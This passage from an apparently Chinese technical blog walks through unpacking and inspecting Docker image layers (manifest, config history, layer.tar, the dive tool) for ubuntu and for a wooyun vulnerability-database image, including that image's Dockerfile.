&quot;8f7ee37aa1d53dcded9b5c22b0a57d8bb8d35d9f42273651668e7aca23bd7581/layer.tar&quot;</span><br><span class="line">        ]</span><br><span class="line">    &#125;]</span><br></pre></td></tr></table></figure>

<p>接着查看<code>825d55fb6340083b06e69e02e823a02918f3ffb575ed2a87026d4645a7fd9e1b.json</code>的内容，该文件记录了镜像的关键信息，该链接简述了每一个字段的意义，如<code>config</code>包含了镜像生成容器时基础的执行参数，<code>Cmd</code>为容器入口点的默认参数 等。</p>
<p>我们主要关注的是 <code>history</code> 列表，它列出了镜像中的每一层，Docker 镜像由这些层堆叠而成。Dockerfile 中几乎每条命令都会变成一个层，描述该命令对镜像所做的更改。在ubuntu镜像中，可以看到history列表实际上有两层， 但是其中一层的<code>empty_layer</code> 标记为 <code>true</code>，这代表着本次操作不改变文件系统镜像，不额外生成新的层，所以ubuntu镜像实际上只有一层。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;architecture&quot;: &quot;amd64&quot;,</span><br><span class="line">    &quot;config&quot;: &#123;</span><br><span class="line">        &quot;Hostname&quot;: &quot;&quot;,</span><br><span class="line">        &quot;Domainname&quot;: &quot;&quot;,</span><br><span class="line">        &quot;User&quot;: &quot;&quot;,</span><br><span class="line">        &quot;AttachStdin&quot;: false,</span><br><span class="line">        &quot;AttachStdout&quot;: false,</span><br><span class="line">        &quot;AttachStderr&quot;: false,</span><br><span class="line">        &quot;Tty&quot;: false,</span><br><span class="line">        &quot;OpenStdin&quot;: false,</span><br><span class="line">        &quot;StdinOnce&quot;: false,</span><br><span class="line">        &quot;Env&quot;: [</span><br><span class="line">            &quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;Cmd&quot;: [</span><br><span class="line">            &quot;bash&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;Image&quot;: &quot;sha256:ccb5a0910a0c4d62d88fd6aec23d035803c808719cc5ce148878f352b1a2a540&quot;,</span><br><span class="line">        &quot;Volumes&quot;: null,</span><br><span class="line">        &quot;WorkingDir&quot;: &quot;&quot;,</span><br><span class="line">        &quot;Entrypoint&quot;: null,</span><br><span class="line">        &quot;OnBuild&quot;: null,</span><br><span class="line">        &quot;Labels&quot;: null</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;container&quot;: &quot;3f151de249ccf525ce2ef3806956fd20f3d4c46ab831529056dde22d50146d4b&quot;,</span><br><span class="line">    &quot;container_config&quot;: &#123;</span><br><span class="line">        &quot;Hostname&quot;: &quot;3f151de249cc&quot;,</span><br><span class="line">        &quot;Domainname&quot;: &quot;&quot;,</span><br><span class="line">        &quot;User&quot;: &quot;&quot;,</span><br><span class="line">        &quot;AttachStdin&quot;: false,</span><br><span class="line">        &quot;AttachStdout&quot;: false,</span><br><span class="line">        &quot;AttachStderr&quot;: false,</span><br><span class="line">        &quot;Tty&quot;: false,</span><br><span class="line">        &quot;OpenStdin&quot;: false,</span><br><span class="line">        &quot;StdinOnce&quot;: false,</span><br><span class="line">        &quot;Env&quot;: [</span><br><span class="line">            &quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;Cmd&quot;: [</span><br><span class="line">            &quot;/bin/sh&quot;,</span><br><span class="line">            &quot;-c&quot;,</span><br><span class="line">            &quot;#(nop) &quot;,</span><br><span class="line">            &quot;CMD [\&quot;bash\&quot;]&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;Image&quot;: &quot;sha256:ccb5a0910a0c4d62d88fd6aec23d035803c808719cc5ce148878f352b1a2a540&quot;,</span><br><span class="line">        &quot;Volumes&quot;: null,</span><br><span class="line">        &quot;WorkingDir&quot;: &quot;&quot;,</span><br><span class="line">        &quot;Entrypoint&quot;: null,</span><br><span class="line">        &quot;OnBuild&quot;: null,</span><br><span class="line">        &quot;Labels&quot;: &#123;&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;created&quot;: &quot;2022-04-05T22:20:51.04675426Z&quot;,</span><br><span class="line">    &quot;docker_version&quot;: &quot;20.10.12&quot;,</span><br><span class="line">    &quot;history&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;created&quot;: &quot;2022-04-05T22:20:50.696744314Z&quot;,</span><br><span class="line">            &quot;created_by&quot;: &quot;/bin/sh -c #(nop) ADD file:b83df51ab7caf8a4dc35f730f5a18a59403300c59eecae4cf5779cba0f6fda6e in / &quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;created&quot;: &quot;2022-04-05T22:20:51.04675426Z&quot;,</span><br><span class="line">            &quot;created_by&quot;: &quot;/bin/sh -c #(nop)  CMD [\&quot;bash\&quot;]&quot;,</span><br><span class="line">            &quot;empty_layer&quot;: true</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;os&quot;: &quot;linux&quot;,</span><br><span class="line">    &quot;rootfs&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;layers&quot;,</span><br><span class="line">        &quot;diff_ids&quot;: [</span><br><span class="line">            &quot;sha256:c5ec52c98b3193052e15d783aca2bef10d8d829fa0d58fedfede511920b8f997&quot;</span><br><span class="line">        ]</span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>在docker中使用<code>docker inspect</code> 和<code>docker history</code> 命令也能查看镜像或容器的相关信息，该信息与上诉是一一对应的。</p>
<p><img data-src="https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicMUXRISwKcGJW9nnXK5b2xcP6mX5ia6VsWEV4lDPxXR8TKwmmPEBPiasDvJ0KzicpbKY9XdIq8vafuMw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p>``</p>
<p><code>docker history ubuntu</code> 命令对应上诉 <code>825d55fb6340083b06e69e02e823a02918f3ffb575ed2a87026d4645a7fd9e1b.json</code> 的<code>history</code>字段。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/null# docker history ubuntu</span><br><span class="line">IMAGE          CREATED       CREATED BY                                      SIZE      COMMENT</span><br><span class="line">825d55fb6340   2 weeks ago   /bin/sh -c #(nop)  CMD [&quot;bash&quot;]                 0B&lt;missing&gt;      2 weeks ago   /bin/sh -c #(nop) ADD file:b83df51ab7caf8a4d…   72.8MB</span><br></pre></td></tr></table></figure>

<p>接下来打开<code>8f7ee37aa1d53dcded9b5c22b0a57d8bb8d35d9f42273651668e7aca23bd7581</code>文件夹，该文件夹包含三个文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">VERSION</span><br><span class="line">json</span><br><span class="line">layer.tar</span><br></pre></td></tr></table></figure>

<p>其中<code>VERSION</code>代表ubuntu的版本，值为1.0；<code>json</code>文件的很多内容是与上面是重合的。镜像的核心内容在<code>layer.tar</code>里，将该文件解压，可以发现该文件夹的内容就是对应linux文件系统。在ubuntu的镜像中，大部分文件存在于<code>usr/bin</code>目录，对应了ubuntu系统的 一些常见的命令，如ls、apt-get等。</p>
<p><img data-src="https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicMUXRISwKcGJW9nnXK5b2xcrp5QlUUvgsOULXFaktNXXGYlGG8Ze96odtdp1Nh5dDCmO09dYgC1PA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p>使用DIVE能够更好的查看镜像每一层的内容，和各层比上一层做出的改变，下图为dive分析ubuntu的界面。DIVE主要具有以下主要功能：</p>
<ul>
<li>屏幕左上角提供镜像层列表以及与每个镜像层的大小。</li>
<li>提供有关镜像的效率（百分比值）、潜在浪费的空间以及镜像的总大小的一般统计信息。</li>
<li>对于每个选定的镜像层，右边会显示出该层对应的文件系统视图，其中包含每个文件夹大小的数据。</li>
</ul>
<p><img data-src="https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicMUXRISwKcGJW9nnXK5b2xcST4ehR5axoHrLdV7YsL5iaqibLiaicDRHuNuSJQd8K09gAOOGlxZKpPVng/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p>DIVE使用的一些快捷键：</p>
<ul>
<li><strong>Ctrl+Spacebar</strong> - 左右面板切换</li>
<li><strong>Spacebar</strong> - 打开/关闭目录树,</li>
<li><strong>Ctrl+A</strong> - 显示/关闭添加的文件,</li>
<li><strong>Ctrl+R</strong> - 显示/关闭移除的文件,</li>
<li><strong>Ctrl+M</strong> - 显示/关闭修改的文件,</li>
<li><strong>Ctrl+U</strong> - 显示/关闭未修改的文件,</li>
<li><strong>Ctrl+ L</strong> - 显示镜像层变动,</li>
<li><strong>Ctrl+/</strong> - 过滤文件,</li>
<li><strong>Ctrl+C</strong> - 退出.</li>
</ul>
<p>由于ubuntu镜像只有一层，所以看不出层与层之间内容的变化，所以这里启动ubuntu容器，并像容器中写入一些内容来观察在容器中进行操作对于容器镜像的改变。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/null# docker run -it --name ubuntu_test ubuntu</span><br><span class="line">root@871b5aa0e0c5:/# echo hello &gt; hello.txt</span><br><span class="line">root@871b5aa0e0c5:/# echo world &gt; world.txt</span><br><span class="line">root@871b5aa0e0c5:/# exitexit</span><br></pre></td></tr></table></figure>

<p>接着将容器打包成镜像并导出，以便进一步分析</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker commit ubuntu_test ubuntu_test</span><br><span class="line">docker save -o ubuntu_test.tar ubuntu_test</span><br></pre></td></tr></table></figure>

<p>将<code>ubuntu_test.tar</code>解压，发现相比于原来的<code>ubuntu.tar</code>解压后的文件，多了一个文件夹，也就意味着多了一层。</p>
<p>查看<code>manifest.json</code>查看变化，发现<code>Layers</code>中也已经多了一层<code>&quot;804da1860ebbda2e61e48e68b0fd1c7f2ddebfcfbc18dbb5c865d2b76d01cc29/layer.tar&quot;</code></p>
<p>查看<code>05feb719705701fda9a39795e16f245df59db1c26261112f88d81131511e6111.json</code>文件的<code>history</code>字段，同样的多出了一层: <code>created</code>表示创建的时间，<code>created_by</code>表示创建的命令。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&quot;history&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;created&quot;: &quot;2022-04-05T22:20:50.696744314Z&quot;,</span><br><span class="line">            &quot;created_by&quot;: &quot;/bin/sh -c #(nop) ADD file:b83df51ab7caf8a4dc35f730f5a18a59403300c59eecae4cf5779cba0f6fda6e in / &quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;created&quot;: &quot;2022-04-05T22:20:51.04675426Z&quot;,</span><br><span class="line">            &quot;created_by&quot;: &quot;/bin/sh -c #(nop)  CMD [\&quot;bash\&quot;]&quot;,</span><br><span class="line">            &quot;empty_layer&quot;: true</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;created&quot;: &quot;2022-04-22T02:20:20.681237703Z&quot;,</span><br><span class="line">            &quot;created_by&quot;: &quot;bash&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br></pre></td></tr></table></figure>

<p>打开新文件夹，解压<code>layer.tar</code>里面的内容便为我们对容器的操作添加更改的内容，一共更改了三处，其中<code>hello.txt</code>和<code>world.txt</code>是我们手动添加的文件，root文件夹下的<code>.bash_history</code>是记录执行过命令。</p>
<p><img data-src="https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicMUXRISwKcGJW9nnXK5b2xcRobicwF0bIKqfPoia3HyPibicuUB6VkiciaPUSyjN3ibOxk0dYvepIaxea1XQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dive ubuntu_test</span><br></pre></td></tr></table></figure>

<p>tap键可以切换左右视图，上下键进行切换条目，在右边可以很明显的表示第二层相比于第一层改变的地方，黄色表示改变的目录，绿色代表改变的文件，刚好对应新生成文件夹的内容。</p>
<h3 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h3><p>下面分享一些对容器镜像进行分析的网站或工具</p>
<ol>
<li>contains，一个支持在线分析容器镜像的网站。</li>
<li>trivy，镜像扫描工具，可以检测镜像、文件系统、git存储库的漏洞以及配置问题</li>
<li>Clair，静态分析容器镜像中的漏洞</li>
<li>Anchore，用于深度分析docker镜像，扫描容器镜像和文件系统中的漏洞。</li>
<li>Dagda，用于对 docker 镜像和容器中的木马、恶意软件、病毒等已知漏洞进行静态分析。</li>
<li>Aqua Security，保护使用容器等云原生技术构建的应用程序。</li>
</ol>
<h2 id="wooyun容器逆向"><a href="#wooyun容器逆向" class="headerlink" title="wooyun容器逆向"></a>wooyun容器逆向</h2><p>安装参考：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9odWIuZG9ja2VyLmNvbS9yL3Y3aGluYy93b295dW4=">v7hinc/wooyun - Docker Image | Docker Hub</span></p>
<h3 id="dockerfile"><a href="#dockerfile" class="headerlink" title="dockerfile"></a>dockerfile</h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1Y3aGluYy93b295dW5fZmluYWwvYmxvYi9tYXN0ZXIvRG9ja2VyZmlsZQ==">V7hinc/wooyun_final： 根据hanc00l和m0l1ce提供的数据构建docker版的乌云漏洞库，包含8.8W漏洞信息 (github.com)</span></p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">MAINTAINER</span> V7hinc</span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> WOOYUN_DB=<span class="string">&quot;wooyun&quot;</span></span><br><span class="line"><span class="keyword">ENV</span> DB_Root_Password=<span class="string">&quot;wooyun&quot;</span></span><br><span class="line"><span class="keyword">ENV</span> SITE_ROOT /home/wwwroot/default</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">set</span> -x;\</span></span><br><span class="line"><span class="language-bash">yum -y install wget git;\</span></span><br><span class="line"><span class="language-bash"><span class="built_in">cd</span> /tmp;\</span></span><br><span class="line"><span class="language-bash"><span class="comment"># 安装lamp</span></span></span><br><span class="line">wget http://soft.vpser.net/lnmp/lnmp1.<span class="number">7</span>.tar.gz -cO lnmp1.<span class="number">7</span>.tar.gz;\</span><br><span class="line">tar zxf lnmp1.<span class="number">7</span>.tar.gz &amp;&amp; cd lnmp1.<span class="number">7</span>;\</span><br><span class="line"><span class="comment"># lnmp脚本无人值守命令解释：DBSelect=&quot;6&quot;表示MariaDB 5.5、PHPSelect=&quot;5&quot;表示PHP5.6、SelectMalloc=&quot;1&quot;表示不安装内存分配器、ApacheSelect=&quot;1&quot;表示Apache2.2，其他请查看https://lnmp.org/faq/v1-5-auto-install.html</span></span><br><span class="line">LNMP_Auto=<span class="string">&quot;y&quot;</span> DBSelect=<span class="string">&quot;6&quot;</span> DB_Root_Password=<span class="string">&quot;$&#123;DB_Root_Password&#125;&quot;</span> InstallInnodb=<span class="string">&quot;y&quot;</span> PHPSelect=<span class="string">&quot;5&quot;</span> SelectMalloc=<span class="string">&quot;1&quot;</span> ApacheSelect=<span class="string">&quot;1&quot;</span> ServerAdmin=<span class="string">&quot;&quot;</span> ./install.sh lamp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入网站根目录</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> <span class="variable">$&#123;SITE_ROOT&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 网站源码拉取</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">set</span> -x;\</span></span><br><span class="line"><span class="language-bash"><span class="comment"># 清除网站根目录下的默认数据</span></span></span><br><span class="line">rm -rf *;\</span><br><span class="line"><span class="comment"># 拉取网站源码到当前目录</span></span><br><span class="line">git clone https://github.com/V7hinc/wooyun_final.git ./;\</span><br><span class="line"><span class="comment"># 删除Dockerfile文件</span></span><br><span class="line">rm -rf Dockerfile;\</span><br><span class="line"><span class="comment"># 替换数据库密码</span></span><br><span class="line">sed -i <span class="string">&quot;s/root\&quot;)/$&#123;DB_Root_Password&#125;\&quot;)/&quot;</span> conn.php;</span><br><span class="line"></span><br><span class="line"><span class="comment"># wooyun数据库恢复</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">set</span> -x;\</span></span><br><span class="line"><span class="language-bash"><span class="comment"># 开启mariadb</span></span></span><br><span class="line">lnmp mariadb restart;\</span><br><span class="line"><span class="comment"># 创建数据库wooyun</span></span><br><span class="line">create_db_sql=<span class="string">&quot;create database IF NOT EXISTS $&#123;WOOYUN_DB&#125;&quot;</span>;\</span><br><span class="line">mysql -hlocalhost -P3306 -uroot -p$&#123;DB_Root_Password&#125; -e <span class="string">&quot;$&#123;create_db_sql&#125;&quot;</span>;\</span><br><span class="line"><span class="comment"># 下载数据库源文件</span></span><br><span class="line">echo <span class="string">&quot;正在下载wooyun_bugs_db.tar.bz2文件&quot;</span>;\</span><br><span class="line">wget -c https://github.com/V7hinc/wooyun_final/releases/download/<span class="number">1.0</span>/wooyun_bugs_db.tar.bz2;\</span><br><span class="line"><span class="comment"># 解压数据库源文件到wooyun数据库目录下</span></span><br><span class="line">tar xjvf wooyun_bugs_db.tar.bz2 -C /usr/local/mariadb/var/$&#123;WOOYUN_DB&#125;;\</span><br><span class="line"><span class="comment"># 清除压缩包</span></span><br><span class="line">rm -rf wooyun_bugs_db.tar.bz2;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编写开机启动脚本</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">set</span> -x;\</span></span><br><span class="line"><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;#!/bin/bash&quot;</span> &gt;&gt; /autostart.sh;\</span></span><br><span class="line"><span class="language-bash"><span class="comment"># nginx 重启</span></span></span><br><span class="line">echo <span class="string">&quot;lnmp restart;&quot;</span> &gt;&gt; /autostart.sh;\</span><br><span class="line"><span class="comment"># 保持前台</span></span><br><span class="line">echo <span class="string">&quot;/bin/bash;&quot;</span> &gt;&gt; /autostart.sh;\</span><br><span class="line">chmod <span class="number">755</span> /autostart.sh;</span><br><span class="line"></span><br><span class="line"><span class="keyword">VOLUME</span><span class="language-bash"> [<span class="string">&quot;<span class="variable">$&#123;SITE_ROOT&#125;</span>/upload&quot;</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">3306</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换进入docker容器默认路径为网站根目录</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> <span class="variable">$&#123;SITE_ROOT&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;/autostart.sh&quot;</span>]</span></span><br></pre></td></tr></table></figure>



<h3 id="镜像分析-1"><a href="#镜像分析-1" class="headerlink" title="镜像分析"></a>镜像分析</h3><p>docker查找该镜像</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search wooyun</span><br></pre></td></tr></table></figure>

<p>docker 拉取镜像容器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull v7hinc/wooyun</span><br></pre></td></tr></table></figure>

<p>导出镜像，保存为wooyun.tar（需要几十秒时间，看镜像的大小）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save -o wooyun.tar v7hinc/wooyun</span><br></pre></td></tr></table></figure>

<p>解压缩该tar文件：</p>
<p><img data-src="C:\Users\shell'co'de\AppData\Roaming\Typora\typora-user-images\image-20220815164633387.png" alt="image-20220815164633387"></p>
<p>首先查看<code>manifest.json</code>的内容,可以看出该文件一共包含了三个字段，<code>Config</code>、<code>RepoTages</code>和<code>Layers</code>。</p>
<ul>
<li><code>Config</code> 的值为镜像配置文件的<code>json</code>文件，对应<code>733242646ba649f19be0efe15eb0dfee995e0ae431fdcce76688a072f82925d3.json</code>；</li>
<li><code>RepoTages</code> 为镜像的名称和标签；</li>
<li><code>Layers</code> 包含了镜像的有哪些层，每一个元素代表一个层目录，由此可见ubuntu含有五个层，对应<code>33b5e87a65b65985a0445827bd27436b3467bb578d1b1cc2aa0b6000685fb4bf/layer.tar</code> <code>e203e4e9c0ac9eb1226cb20ac3da1946c2378ad4574b6c7d31f91edd5bfd2617/layer.tar</code> <code>519c3f049f3fdc543f41ade13ec96b228e0c6ce2f68b3cb7444d63cf860c8dea/layer.tar</code>  <code>e7ed979c2c7053a45f10ce0b625eb7e0679d11512c96d55a4f5d25a351201569/layer.tar</code>  <code>fd857d4057e86fcdf2de6b09a0e13442010a46401744924bf9ed921806c44754/layer.tar</code></li>
</ul>
<p><img data-src="C:\Users\shell'co'de\AppData\Roaming\Typora\typora-user-images\image-20220815165124131.png" alt="image-20220815165124131"></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;Config&quot;</span><span class="punctuation">:</span><span class="string">&quot;733242646ba649f19be0efe15eb0dfee995e0ae431fdcce76688a072f82925d3.json&quot;</span><span class="punctuation">,</span><span class="attr">&quot;RepoTags&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;v7hinc/wooyun:latest&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;Layers&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;33b5e87a65b65985a0445827bd27436b3467bb578d1b1cc2aa0b6000685fb4bf/layer.tar&quot;</span><span class="punctuation">,</span><span class="string">&quot;e203e4e9c0ac9eb1226cb20ac3da1946c2378ad4574b6c7d31f91edd5bfd2617/layer.tar&quot;</span><span class="punctuation">,</span><span class="string">&quot;519c3f049f3fdc543f41ade13ec96b228e0c6ce2f68b3cb7444d63cf860c8dea/layer.tar&quot;</span><span class="punctuation">,</span><span class="string">&quot;e7ed979c2c7053a45f10ce0b625eb7e0679d11512c96d55a4f5d25a351201569/layer.tar&quot;</span><span class="punctuation">,</span><span class="string">&quot;fd857d4057e86fcdf2de6b09a0e13442010a46401744924bf9ed921806c44754/layer.tar&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>

<p>查看733242646ba649f19be0efe15eb0dfee995e0ae431fdcce76688a072f82925d3.json的内容：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td 